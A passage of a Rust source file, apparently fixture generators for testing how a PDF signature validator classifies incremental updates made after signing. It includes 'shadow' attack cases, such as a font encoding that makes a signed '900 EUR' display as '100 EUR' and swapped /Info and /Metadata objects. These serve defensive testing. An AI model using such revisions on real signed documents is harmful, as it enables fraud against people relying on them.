/// lacks ([`orphan_text_widget_da_font_input`]), a revision that adds `/DR /Font /F7`: a new
/// Helvetica whose `/Differences` draw the code of `9` as the glyph `one`, so a viewer that
/// constructs the widget's appearance shows "100 EUR" for its value "900 EUR" (expert finding,
/// round 5, `u_orphan_f7`: poppler shows different text after the update). Folioxide: `OTHER`;
/// pyHanko: `FORM_FILLING` (it clears what a new `/DR` holds).
pub fn shadow_acroform_dr_font_orphan_widget_da(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |store, dict| {
        let mut dr = dict.get_dict(b"DR")?.clone();
        let mut fonts = dr.get_dict(b"Font")?.clone();
        if fonts.contains_key(b"F7") {
            return None;
        }
        let mut encoding = Dict::new();
        encoding.insert("Type", Object::name("Encoding"));
        encoding.insert("BaseEncoding", Object::name("WinAnsiEncoding"));
        encoding.insert(
            "Differences",
            Object::Array(vec![Object::Int(57), Object::name("one")]),
        );
        let mut font = Dict::new();
        font.insert("Type", Object::name("Font"));
        font.insert("Subtype", Object::name("Type1"));
        font.insert("BaseFont", Object::name("Helvetica"));
        font.insert("Encoding", Object::Dict(encoding));
        let font = store.add(Object::Dict(font)).ok()?;
        fonts.insert("F7", Object::Ref(font));
        dr.insert("Font", Object::Dict(fonts));
        dict.insert("DR", Object::Dict(dr));
        Some(())
    })
}

/// `shadow_acroform_dr_encoding_added`: the AcroForm's direct `/DR` gains a direct `/Encoding
/// << /PDFDocEncoding << /Type /Encoding /Differences [...] >> >>` (Table 224: the encodings
/// Acrobat lists for regenerating appearances), which changes how regenerated text maps to
/// glyphs. Folioxide: `OTHER` (only names in the resource categories may be added); pyHanko:
/// `LTA_UPDATES`. A real Acrobat co-signed sample should be checked before M4: Acrobat writes
/// `/DR /Encoding`, and a later Acrobat signature that adds it would make earlier signatures
/// `OTHER`.
pub fn shadow_acroform_dr_encoding_added(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |_, dict| {
        let mut dr = dict.get_dict(b"DR")?.clone();
        if dr.contains_key(b"Encoding") {
            return None;
        }
        let mut encoding = Dict::new();
        encoding.insert("Type", Object::name("Encoding"));
        encoding.insert(
            "Differences",
            Object::Array(vec![
                Object::Int(48),
                Object::name("nine"),
                Object::name("one"),
            ]),
        );
        let mut encodings = Dict::new();
        encodings.insert("PDFDocEncoding", Object::Dict(encoding));
        dr.insert("Encoding", Object::Dict(encodings));
        dict.insert("DR", Object::Dict(dr));
        Some(())
    })
}

/// `acroform_dr_name_added`: the control case, the AcroForm's `/DR /Font` gains a new name
/// `/Cour` (a new Courier font), as a later signer may add the font of its own appearance:
/// `FORM_FILLING` in both.
pub fn acroform_dr_name_added(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_dr_fonts(pdf, |fonts, courier| {
        if fonts.contains_key(b"Cour") {
            return None;
        }
        fonts.insert("Cour", Object::Ref(courier));
        Some(())
    })
}

/// `acroform_da_added`: a `/DA` added to an AcroForm that has none (our own signature's
/// AcroForm, whose only field is the signature field): Folioxide `OTHER` (any change to the
/// AcroForm `/DA` is, since an added `/DA` restyles every field viewers construct an
/// appearance for), pyHanko `LTA_UPDATES` (an exempt key).
pub fn acroform_da_added(pdf: &[u8]) -> Option<Vec<u8>> {
    edit_acroform(pdf, |_, dict| {
        if dict.contains_key(b"DA") {
            return None;
        }
        dict.insert("DA", Object::literal_string("/Helv 0 Tf 0 g"));
        Some(())
    })
}

// =================================================================================================
// Shadow: role objects the new revision no longer points to (QA finding, round 3).
// =================================================================================================

/// A minimal XMP packet (ISO 16684-1) whose `dc:title` is `title`.
fn xmp_packet(title: &str) -> Vec<u8> {
    format!(
        "<?xpacket begin=\"\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?>\n\
         <x:xmpmeta xmlns:x=\"adobe:ns:meta/\">\
         <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\">\
         <rdf:Description rdf:about=\"\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\">\
         <dc:title><rdf:Alt><rdf:li xml:lang=\"x-default\">{title}</rdf:li></rdf:Alt></dc:title>\
         </rdf:Description></rdf:RDF></x:xmpmeta>\n<?xpacket end=\"w\"?>"
    )
    .into_bytes()
}

/// A new XMP metadata stream (§14.3.2) whose title is `title`.
fn add_metadata(store: &mut Store, title: &str) -> Option<ObjectId> {
    let mut dict = Dict::new();
    dict.insert("Type", Object::name("Metadata"));
    dict.insert("Subtype", Object::name("XML"));
    let stream = folioxide_syntax::Stream::new(dict, StreamData::Decoded(xmp_packet(title)));
    store.add(Object::Stream(Box::new(stream))).ok()
}

/// A new document information dictionary (§14.3.3) whose `/Title` is `title`.
fn add_info(store: &mut Store, title: &str) -> Option<ObjectId> {
    let mut info = Dict::new();
    info.insert("Title", Object::literal_string(title));
    store.add(Object::Dict(info)).ok()
}

/// An unsigned document for the role-pointer cases: `pdf` (`minimal`-like) with a revision that
/// adds a trailer `/Info` dictionary and a catalog `/Metadata` XMP stream, both titled
/// "Invoice".
pub fn info_metadata_input(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let info = add_info(store, "Invoice")?;
        store
            .set_trailer_entry(keys::INFO, Object::Ref(info))
            .ok()?;
        let metadata = add_metadata(store, "Invoice")?;
        let root = store.root_id()?;
        let mut catalog = store.resolve(root).ok()?.as_dict()?.clone();
        catalog.insert("Metadata", Object::Ref(metadata));
        store.set(root, Object::Dict(catalog)).ok()
    })
}

/// Sets the `/Title` of the trailer's current `/Info` dictionary `info` to `title`.
fn retitle_info(store: &mut Store, info: ObjectId, title: &str) -> Option<()> {
    let mut dict = store.resolve(info).ok()?.as_dict()?.clone();
    dict.insert("Title", Object::literal_string(title));
    store.set(info, Object::Dict(dict)).ok()
}

/// Replaces the data of the XMP metadata stream `metadata` with a packet titled `title`.
fn retitle_metadata(store: &mut Store, metadata: ObjectId, title: &str) -> Option<()> {
    let dict = store.resolve(metadata).ok()?.as_stream()?.dict.clone();
    let stream = folioxide_syntax::Stream::new(dict, StreamData::Decoded(xmp_packet(title)));
    store.set(metadata, Object::Stream(Box::new(stream))).ok()
}

/// The catalog's `/Metadata` stream and the catalog.
fn catalog_metadata(store: &Store) -> Option<(ObjectId, ObjectId)> {
    let root = store.root_id()?;
    let metadata = store.resolve(root).ok()?.as_dict()?.get_ref(b"Metadata")?;
    Some((root, metadata))
}

/// `shadow_info_repoint_old_changed`: on a document signed with an `/Info` dictionary
/// ([`info_metadata_input`]), a revision that points the trailer's `/Info` to a new dictionary
/// and also changes the old one (seeds 902174 and others of QA's differential): the old
/// dictionary is no longer the `/Info`, so its change is `OTHER` (pyHanko too).
pub fn shadow_info_repoint_old_changed(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let old = store.trailer().get_ref(keys::INFO)?;
        let new = add_info(store, "Invoice")?;
        store.set_trailer_entry(keys::INFO, Object::Ref(new)).ok()?;
        retitle_info(store, old, "Paid")
    })
}

/// `shadow_info_removed_old_changed`: a revision that removes the trailer's `/Info` and changes
/// the dictionary it named. Folioxide: `OTHER` (the newest trailer no longer names it);
/// pyHanko: `LTA_UPDATES` (its trailer view inherits `/Info` from the older trailer, so it takes
/// the changed dictionary for the current `/Info`).
pub fn shadow_info_removed_old_changed(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let old = store.trailer().get_ref(keys::INFO)?;
        store.remove_trailer_entry(keys::INFO).ok()??;
        retitle_info(store, old, "Paid")
    })
}

/// `info_changed_in_place`: the control case, the `/Info` dictionary's `/Title` changed in
/// place (`LTA_UPDATES` in both).
pub fn info_changed_in_place(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let info = store.trailer().get_ref(keys::INFO)?;
        retitle_info(store, info, "Paid")
    })
}

/// `shadow_metadata_repoint_old_changed`: a revision that points the catalog's `/Metadata` to a
/// new XMP stream and also changes the old one: `OTHER` (pyHanko too).
pub fn shadow_metadata_repoint_old_changed(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let (root, old) = catalog_metadata(store)?;
        let new = add_metadata(store, "Invoice")?;
        let mut catalog = store.resolve(root).ok()?.as_dict()?.clone();
        catalog.insert("Metadata", Object::Ref(new));
        store.set(root, Object::Dict(catalog)).ok()?;
        retitle_metadata(store, old, "Paid")
    })
}

/// `shadow_metadata_removed_old_changed`: a revision that removes the catalog's `/Metadata` and
/// changes the stream it named: `OTHER` (pyHanko too).
pub fn shadow_metadata_removed_old_changed(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let (root, old) = catalog_metadata(store)?;
        let mut catalog = store.resolve(root).ok()?.as_dict()?.clone();
        catalog.remove(b"Metadata".as_slice())?;
        store.set(root, Object::Dict(catalog)).ok()?;
        retitle_metadata(store, old, "Paid")
    })
}

/// `metadata_changed_in_place`: the control case, the XMP metadata stream rewritten in place
/// (`LTA_UPDATES` in both).
pub fn metadata_changed_in_place(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let (_, metadata) = catalog_metadata(store)?;
        retitle_metadata(store, metadata, "Paid")
    })
}

// =================================================================================================
// Writer-based helpers (reuse the real incremental writer for well-formed revisions).
// =================================================================================================

/// Opens `pdf`, lets `edit` apply store edits (returning `None` to abort), and returns the source
/// with a well-formed incremental update appended. `None` if the store cannot be opened, `edit`
/// aborts, or the store refuses an incremental update (a repaired or reconstructed structure).
fn with_incremental(pdf: &[u8], edit: impl FnOnce(&mut Store) -> Option<()>) -> Option<Vec<u8>> {
    let mut store = Store::open_bytes(pdf.to_vec(), &OpenOptions::default()).ok()?;
    edit(&mut store)?;
    store.save_incremental(&IncrementalOptions::default()).ok()
}

/// Replaces object `id` with a decoded content stream carrying `data`.
fn set_stream(store: &mut Store, id: ObjectId, data: &[u8]) -> Option<()> {
    let stream = folioxide_syntax::Stream::new(Dict::new(), StreamData::Decoded(data.to_vec()));
    store.set(id, Object::Stream(Box::new(stream))).ok()
}

/// The first object of the store that is a `/Type /Page` dictionary.
fn first_page(store: &Store) -> Option<ObjectId> {
    first_object_of_type(store, b"Page")
}

/// The `/Contents` reference of the first page, when it is a single indirect reference.
fn first_page_contents(store: &Store) -> Option<ObjectId> {
    let page = first_page(store)?;
    store.resolve(page).ok()?.as_dict()?.get_ref(keys::CONTENTS)
}

/// The first signature dictionary: an object with `/Type /Sig`, or with a `/ByteRange`.
fn first_sig_dict(store: &Store) -> Option<ObjectId> {
    for id in store.object_ids() {
        if let Ok(obj) = store.resolve(id)
            && let Some(d) = obj.as_dict()
            && (d.is_type(b"Sig") || d.get_array(b"ByteRange").is_some())
        {
            return Some(id);
        }
    }
    None
}

/// The first object with `/Type <ty>`.
fn first_object_of_type(store: &Store, ty: &[u8]) -> Option<ObjectId> {
    for id in store.object_ids() {
        if let Ok(obj) = store.resolve(id)
            && obj.as_dict().is_some_and(|d| d.is_type(ty))
        {
            return Some(id);
        }
    }
    None
}

/// The first object with `/Subtype <sub>`.
fn first_object_of_subtype(store: &Store, sub: &[u8]) -> Option<ObjectId> {
    for id in store.object_ids() {
        if let Ok(obj) = store.resolve(id)
            && obj
                .as_dict()
                .and_then(|d| d.get_name(keys::SUBTYPE))
                .is_some_and(|name| name == sub)
        {
            return Some(id);
        }
    }
    None
}

// =================================================================================================
// Small byte utilities.
// =================================================================================================

/// The first position of `needle` in `haystack`.
fn find(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || needle.len() > haystack.len() {
        return None;
    }
    haystack.windows(needle.len()).position(|w| w == needle)
}

/// The last position of `needle` in `haystack`.
fn rfind(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || needle.len() > haystack.len() {
        return None;
    }
    haystack.windows(needle.len()).rposition(|w| w == needle)
}

/// The first non-white-space position at or after `from` (comments are not skipped).
fn skip_ws(pdf: &[u8], from: usize) -> Option<usize> {
    let mut i = from;
    while let Some(&b) = pdf.get(i) {
        if !is_ws(b) {
            return Some(i);
        }
        i = i.checked_add(1)?;
    }
    (from <= pdf.len()).then_some(pdf.len())
}

/// Whether `b` is PDF white-space (§7.2.3).
fn is_ws(b: u8) -> bool {
    matches!(b, b'\0' | b'\t' | b'\n' | 0x0C | b'\r' | b' ')
}

/// Whether `b` is a PDF delimiter (§7.2.3).
fn is_delim(b: u8) -> bool {
    matches!(
        b,
        b'(' | b')' | b'<' | b'>' | b'[' | b']' | b'{' | b'}' | b'/' | b'%'
    )
}

/// Decodes a hexadecimal string's digits (ignoring white-space, §7.3.4.3) into bytes. An odd
/// final digit is padded with `0`. `None` on a non-hexadecimal, non-white-space byte.
fn decode_hex(hex: &[u8]) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(hex.len() / 2);
    let mut hi: Option<u8> = None;
    for &b in hex {
        if is_ws(b) {
            continue;
        }
        let nibble = (b as char).to_digit(16)? as u8;
        match hi.take() {
            Some(h) => out.push((h << 4) | nibble),
            None => hi = Some(nibble),
        }
    }
    if let Some(h) = hi {
        out.push(h << 4);
    }
    Some(out)
}

/// Uppercase hexadecimal digits for `bytes`.
fn encode_hex(bytes: &[u8]) -> Vec<u8> {
    const DIGITS: &[u8; 16] = b"0123456789ABCDEF";
    let digit = |nibble: u8| DIGITS.get(usize::from(nibble)).copied().unwrap_or(b'0');
    let mut out = Vec::with_capacity(bytes.len() * 2);
    for &b in bytes {
        out.push(digit(b >> 4));
        out.push(digit(b & 0x0F));
    }
    out
}

/// Trims `der` to the length its outer TLV declares (definite form), so trailing zero padding in
/// `/Contents` is dropped. Returns `der` unchanged when it is not a parseable definite-length
/// TLV.
fn trim_to_der(der: &[u8]) -> &[u8] {
    der_total_len(der).map_or(der, |len| der.get(..len).unwrap_or(der))
}

/// The total length (header plus content) of the definite-length DER TLV at the start of `der`.
fn der_total_len(der: &[u8]) -> Option<usize> {
    let len_byte = *der.get(1)?;
    if len_byte < 0x80 {
        return 2usize.checked_add(usize::from(len_byte));
    }
    let count = usize::from(len_byte & 0x7F);
    if count == 0 || count > 4 {
        return None;
    }
    let mut len = 0usize;
    for i in 0..count {
        len = len
            .checked_shl(8)?
            .checked_add(usize::from(*der.get(2 + i)?))?;
    }
    2usize.checked_add(count)?.checked_add(len)
}

#[cfg(test)]
mod tests;
